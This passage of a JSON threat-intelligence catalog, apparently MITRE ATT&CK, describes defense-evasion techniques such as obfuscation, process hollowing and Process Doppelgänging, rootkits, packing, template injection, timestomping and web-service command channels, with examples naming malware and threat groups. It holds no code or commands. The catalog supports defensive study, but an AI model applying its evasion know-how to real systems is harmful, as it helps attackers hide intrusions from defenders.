            "Description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. [1] Adversaries may also used compressed or archived scripts, such as Javascript.Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. [2] Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. [3]Adversaries may also obfuscate commands executed from payloads or directly via a Command-Line Interface. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. [4] [5] [6]Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding Invoke-PSImage. The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. [7] By the end of 2017, an adversary group used Invoke-PSImage to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. [8]\n",
            "ID": "T1027",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Network protocol analysis, Process use of network, File monitoring, Malware reverse engineering, Binary file metadata, Process command-line parameters, Environment variable, Process monitoring, Windows event logs, Network intrusion detection system, Email gateway, SSL/TLS inspection",
            "Defense Bypassed: ": "Host forensic analysis, Signature-based detection, Host intrusion prevention systems, Application whitelisting, Process whitelisting, Log analysis, Whitelisting by file name or path",
            "Contributors: ": "Red Canary; Christiaan Beek, @ChristiaanBeek",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "Most of the strings in ADVSTORESHELL are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.[9][10]"
                },
                {
                    "Name": "APT19",
                    "Description": "APT19 used Base64 to obfuscate commands and the payload.[11]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4.[10][12][13]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 obfuscates files or information to help evade defensive measures.[14]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 uses the Invoke-Obfuscation framework to obfuscate their PowerShell and also performs other code obfuscation.[15][16][17]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 sends images to users that are embedded with shellcode and obfuscates strings and payloads.[18]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal's DLL file and non-malicious decoy file are encrypted with RC4.[19]"
                },
                {
                    "Name": "BlackOasis",
                    "Description": "BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.[20]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak encrypts strings to make analysis more difficult.[21]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR.[22]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie uses RC4 and Base64 to obfuscate strings.[23]"
                },
                {
                    "Name": "CORESHELL",
                    "Description": "CORESHELL obfuscates strings using a custom stream cipher.[24]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "The payload of CozyCar is encrypted with simple XOR with a rotating key. The CozyCar configuration file has been encrypted with RC4 keys.[25]"
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal has obfuscated strings in Bandook by base64 encoding, and then encrypting them.[26]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.[27]"
                },
                {
                    "Name": "Dust Storm",
                    "Description": "Dust Storm has encoded payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key.[28]"
                },
                {
                    "Name": "DustySky",
                    "Description": "The DustySky dropper uses a function to obfuscate the name of functions and other parts of the malware.[29]"
                },
                {
                    "Name": "Elderwood",
                    "Description": "Elderwood has encrypted documents and malicious executables.[30]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise encrypts several of its files, including configuration files.[31]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Variants of Emissary encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the \"srand\" and \"rand\" functions.[32][33]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT encrypts strings in the backdoor using a custom XOR algorithm.[34]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.[4][35]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has used environment variables and standard input (stdin) to obfuscate command-line arguments. FIN8 also obfuscates malicious macros delivered as payloads.[4][36]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.[37][38]"
                },
                {
                    "Name": "FruitFly",
                    "Description": "FruitFly executes and stores obfuscated Perl scripts.[39]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.[40]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT supports file encryption (AES with the key \"lolomycin2017\").[41]"
                },
                {
                    "Name": "Group5",
                    "Description": "Group5 disguised its malicious binaries with several layers of obfuscation, including encrypting the files.[42]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 uses multiple techniques to obfuscate strings, including XOR.[43]"
                },
                {
                    "Name": "Helminth",
                    "Description": "The Helminth config file is encrypted with RC4.[44]"
                },
                {
                    "Name": "Hi-Zor",
                    "Description": "Hi-Zor uses various XOR techniques to obfuscate its components.[45]"
                },
                {
                    "Name": "HOMEFRY",
                    "Description": "Some strings in are obfuscated with XOR x56.[46]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee drops files with base64-encoded data.[47]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser's code may be obfuscated through structured exception handling and return-oriented programming.[48]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq uses basic obfuscation in the form of spaghetti code.[30][49]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "InnaputRAT uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.[50]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole avoids analysis by encrypting all strings, internal files, configuration data.[51]"
                },
                {
                    "Name": "Invoke-PSImage",
                    "Description": "Invoke-PSImage can be used to embed a PowerShell script within the pixels of a PNG file.[52]"
                },
                {
                    "Name": "ISMInjector",
                    "Description": "ISMInjector is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.[53]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "Many strings in JHUHUGIT are obfuscated with a XOR algorithm.[54][55]"
                },
                {
                    "Name": "JPIN",
                    "Description": "A JPIN uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.[56]"
                },
                {
                    "Name": "jRAT",
                    "Description": "jRAT’s Java payload is encrypted with AES.[57]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar is obfuscated using the open source ConfuserEx protector. Kazuar also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.[58]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs downloads additional files that are base64-encoded and encrypted with another cipher.[59]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware uses multiple types of encryption and encoding in its malware files, including AES, Caracachs, RC4, basic XOR with constant 0xA7, and other techniques.[60][61][62][63]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer obfuscated scripts that were used on victim machines.[64]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has obfuscated code using base64 and gzip compression.[65]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware has used base64-encoded commands and files, and has also encrypted embedded strings with AES.[66]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka obfuscates API function names using a substitute cipher combined with Base64 encoding.[67]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.[68][69]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito’s installer is obfuscated with a custom crypter to obfuscate the installer.[70]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has used Daniel Bohannon’s Invoke-Obfuscation framework. The group also used files with base64 encoded PowerShell commands.[71][16][72]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu encodes files in Base64.[73]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has encrypted and encoded data in its malware, including by using base64.[74][75][76]"
                },
                {
                    "Name": "OLDBAIT",
                    "Description": "OLDBAIT obfuscates internal strings and unpacks them at startup.[24]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2. OopsIE also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.[77][78]"
                },
                {
                    "Name": "Orz",
                    "Description": "Some Orz strings are base64 encoded, such as the embedded DLL known as MockDll.[65]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork has obfuscated a script with Crypto Obfuscator.[79]"
                },
                {
                    "Name": "Pisloader",
                    "Description": "Pisloader obfuscates files by splitting strings into smaller sub-strings and including \"garbage\" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.[80]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy hides any strings related to its own indicators of compromise.[81]"
                },
                {
                    "Name": "POSHSPY",
                    "Description": "POSHSPY appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.[82]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).[1]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit contains a collection of ScriptModification modules that compress and encode scripts and payloads.[83][84]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS uses character replacement, PowerShell environment variables, and XOR encoding to obfuscate code.[72]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Some resources in Prikormka are encrypted with a simple XOR operation or encoded with Base64.[85]"
                },
                {
                    "Name": "PUNCHTRACK",
                    "Description": "PUNCHTRACK is loaded and executed by a highly obfuscated launcher.[86]"
                },
                {
                    "Name": "Putter Panda",
                    "Description": "Droppers used by Putter Panda use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.[87]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT was likely obfuscated using Invoke-Obfuscation.[75][16]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver encrypts some of its files with XOR.[88]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "A RedLeaves configuration file is encrypted with a simple XOR key, 0x53.[89]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Some data in Remsec is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.[90][91]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "The PowerShell script with the RogueRobin payload was obfuscated using the COMPRESS technique in Invoke-Obfuscation.[92][16]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm.[93]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Sakula uses single-byte XOR obfuscation to obfuscate many of its files.[94]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon contains base64-encoded strings.[95]"
                },
                {
                    "Name": "SHOTPUT",
                    "Description": "SHOTPUT is obscured using XOR encoding and appended to a valid GIF file.[96][97]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader uses a simple one-byte XOR method to obfuscate values in the malware.[98][99]"
                },
                {
                    "Name": "StreamEx",
                    "Description": "StreamEx obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.[100]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.[101][102]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.[103][104]"
                },
                {
                    "Name": "TINYTYPHON",
                    "Description": "TINYTYPHON has used XOR with 0x90 to obfuscate its configuration file.[105]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.[106]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "APIs and strings in some TYPEFRAME variants are RC4 encrypted. Another variant is encoded with XOR.[107]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "Most strings in USBStealer are encrypted using 3DES and XOR and reversed.[108]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN is obfuscated using the obfuscation tool called ConfuserEx.[109]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "A Volgmer variant is encoded using a simple XOR cipher.[110]"
                },
                {
                    "Name": "XTunnel",
                    "Description": "A version of XTunnel introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.[111]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT has encrypted its payload with RC4.[112]"
                }
            ]
        },
        "Process Doppelgänging": {
            "Name": "Process Doppelgänging",
            "Description": "Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. [1] To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. [2] To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. [3]Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. [4]Adversaries may leverage TxF to a perform a file-less variation of Process Injection called Process Doppelgänging. Similar to Process Hollowing, Process Doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. [4]Process Doppelgänging is implemented in 4 steps [4]:Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.Load – Create a shared section of memory and load the malicious executable.Rollback – Undo changes to original executable, effectively removing malicious code from the file system.Animate – Create a process from the tainted section of memory and initiate execution.\n",
            "ID": "T1186",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM, User",
            "Data Sources: ": "API monitoring, Process monitoring",
            "Defense Bypassed: ": "Process whitelisting, Anti-virus, Whitelisting by file name or path, Signature-based detection",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "SynAck",
                    "Description": "SynAck abuses NTFS transactions to launch and conceal malicious processes.[5][6]"
                }
            ]
        },
        "Process Hollowing": {
            "Name": "Process Hollowing",
            "Description": "Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to Process Injection, execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. [1] [2]\n",
            "ID": "T1093",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, API monitoring",
            "Defense Bypassed: ": "Process whitelisting, Whitelisting by file name or path, Signature-based detection, Anti-virus",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS has a command to download an .exe and use process hollowing to inject it into a new process.[3][4]"
                },
                {
                    "Name": "Bandook",
                    "Description": "Bandook has been launched by starting iexplore.exe and replacing it with Bandook's payload.[5][6]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution.[7]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can use process hollowing for execution.[8]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Duqu is capable of loading executable code via process hollowing.[9]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can use process hollowing to inject one of its trojans into another process.[10]"
                },
                {
                    "Name": "ISMInjector",
                    "Description": "ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.[11]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant.[12]"
                },
                {
                    "Name": "Orz",
                    "Description": "Some Orz versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload.[13]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.[14]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.[15][16]"
                }
            ]
        },
        "Rootkit": {
            "Name": "Rootkit",
            "Description": "Rootkits are programs that hide the existence of malware by intercepting (i.e., Hooking) and modifying operating system API calls that supply system information. [1] Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a Hypervisor, Master Boot Record, or the System Firmware. [2]Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits have been seen for Windows, Linux, and Mac OS X systems. [3] [4]\n",
            "ID": "T1014",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "Administrator, SYSTEM, root",
            "Data Sources: ": "BIOS, MBR, System calls",
            "Defense Bypassed: ": "File monitoring, Host intrusion prevention systems, Process whitelisting, Signature-based detection, System access controls, Whitelisting by file name or path, Anti-virus",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Hacking Team UEFI Rootkit",
                    "Description": "Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.[5]"
                },
                {
                    "Name": "HIDEDRV",
                    "Description": "HIDEDRV is a rootkit that hides certain operating system artifacts.[6]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy starts a rootkit from a malicious file dropped to disk.[7]"
                },
                {
                    "Name": "Umbreon",
                    "Description": "Umbreon hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.[8]"
                },
                {
                    "Name": "Uroburos",
                    "Description": "Uroburos is a rootkit used by Turla.[9]"
                },
                {
                    "Name": "Winnti Group",
                    "Description": "Winnti Group used a rootkit to modify typical server functionality.[10]"
                },
                {
                    "Name": "Zeroaccess",
                    "Description": "Zeroaccess is a kernel-mode rootkit.[11]"
                }
            ]
        },
        "Software Packing": {
            "Name": "Software Packing",
            "Description": "Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, [1] but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.\n",
            "ID": "T1045",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Data Sources: ": "Binary file metadata",
            "Defense Bypassed: ": "Signature-based detection, Anti-virus, Heuristic detection",
            "CAPEC ID: ": "CAPEC-570",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT29",
                    "Description": "APT29 used UPX to pack files.[2]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has been known to pack their tools.[3]"
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal has used UPX to pack Bandook[4]"
                },
                {
                    "Name": "Daserf",
                    "Description": "A version of Daserf uses the MPRESS packer.[5]"
                },
                {
                    "Name": "Elderwood",
                    "Description": "Elderwood has packed malware payloads before delivery to victims.[6]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "A FinFisher variant uses a custom packer.[7][8]"
                },
                {
                    "Name": "Group5",
                    "Description": "Group5 packed an executable by base64 encoding the PE file and breaking it up into numerous lines.[9]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 uses a custom packing algorithm.[10]"
                },
                {
                    "Name": "Night Dragon",
                    "Description": "Night Dragon is known to use software packing in its tools.[11]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.[12]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "A Patchwork payload was packed with UPX.[13]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke has been packed with the UPX packer.[14]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot leverages a custom packer to obfuscate its functionality.[15]"
                },
                {
                    "Name": "Trojan.Karagany",
                    "Description": "Trojan.Karagany samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.[16]"
                },
                {
                    "Name": "Uroburos",
                    "Description": "Uroburos uses a custom packer.[17]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN is initially packed.[18]"
                },
                {
                    "Name": "yty",
                    "Description": "yty packs a plugin with UPX.[19]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "Some ZeroT DLL files have been packed with UPX.[20]"
                }
            ]
        },
        "Template Injection": {
            "Name": "Template Injection",
            "Description": "Microsoft’s Open Office XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. [1]Properties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.Adversaries may abuse this technology to initially conceal malicious code to be executed via documents (i.e. Scripting). Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Spearphishing Attachment and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. [2] Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. [3]This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. [4] [5] [6]\n",
            "ID": "T1221",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Anti-virus, Email gateway, Network intrusion detection system, Web logs",
            "Defense Bypassed: ": "Static File Analysis",
            "Contributors: ": "Patrick Campbell, @pjcampbe11",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "DarkHydrus",
                    "Description": "DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication.[7]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.[8][9]"
                }
            ]
        },
        "Timestomp": {
            "Name": "Timestomp",
            "Description": "Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name Masquerading to hide malware and tools. [1]\n",
            "ID": "T1099",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Defense Bypassed: ": "Host forensic analysis",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "3PARA RAT",
                    "Description": "3PARA RAT has a command to set certain attributes such as creation/modification timestamps on files.[2]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has performed timestomping on victim files.[3]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016.[4]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot modifies the time of a file as specified by the control server.[5]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike will timestomp any files or payloads placed on a target machine to help them blend in.[6]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "The Derusbi malware supports timestomping.[7][8]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise performs timestomping of a CAB file it creates.[9]"
                },
                {
                    "Name": "FALLCHILL",
                    "Description": "FALLCHILL can modify file or directory timestamps.[10]"
                },
                {
                    "Name": "Gazer",
                    "Description": "For early Gazer versions, the compilation timestamp was faked.[11]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole samples were timestomped by the authors by setting the PE timestamps to all zero values. InvisiMole also has a built-in command to modify file times.[12]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Several Lazarus Group malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.[13][14][15][16]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Many Misdat samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.[17]"
                },
                {
                    "Name": "OwaAuth",
                    "Description": "OwaAuth has a command to timestop a file or directory.[18]"
                },
                {
                    "Name": "POSHSPY",
                    "Description": "POSHSPY modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.[19]"
                },
                {
                    "Name": "Psylo",
                    "Description": "Psylo has a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.[20]"
                },
                {
                    "Name": "SEASHARPEE",
                    "Description": "SEASHARPEE can timestomp files on victims using a Web shell.[21]"
                },
                {
                    "Name": "TDTESS",
                    "Description": "After creating a new service for persistence, TDTESS sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.[22]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.[23]"
                }
            ]
        },
        "Web Service": {
            "Name": "Web Service",
            "Description": "Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).\n",
            "ID": "T1102",
            "Tactic": "Command And Control, Defense Evasion",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Host network interface, Netflow/Enclave netflow, Network protocol analysis, Packet capture, SSL/TLS inspection",
            "Requires Network: ": "Yes",
            "Defense Bypassed: ": "Binary Analysis, Log analysis, Firewall",
            "Contributors: ": "Anastasios Pingios",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT37",
                    "Description": "APT37 leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.[1][2]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS can use multiple C2 channels, including RSS feeds, Github, forums, and blogs. BADNEWS also collects C2 information via a dead drop resolver.[3][4][5]"
                },
                {
                    "Name": "BLACKCOFFEE",
                    "Description": "BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server. It has also obfuscated its C2 traffic as normal traffic to sites such as Github.[6][7]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER's MSGET downloader uses a dead drop resolver to access malicious payloads.[8]"
                },
                {
                    "Name": "CALENDAR",
                    "Description": "The CALENDAR malware communicates through the use of events in Google Calendar.[9][10]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2.[11]"
                },
                {
                    "Name": "CloudDuke",
                    "Description": "One variant of CloudDuke uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.[12]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.[13]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "CozyCar uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.[14]"
                },
                {
                    "Name": "DOGCALL",
                    "Description": "DOGCALL is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.[1]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.[15]"
                },
                {
                    "Name": "GLOOXMAIL",
                    "Description": "GLOOXMAIL communicates to servers operated by Google using the Jabber/XMPP protocol.[9][16]"
                },
                {
                    "Name": "HAMMERTOSS",
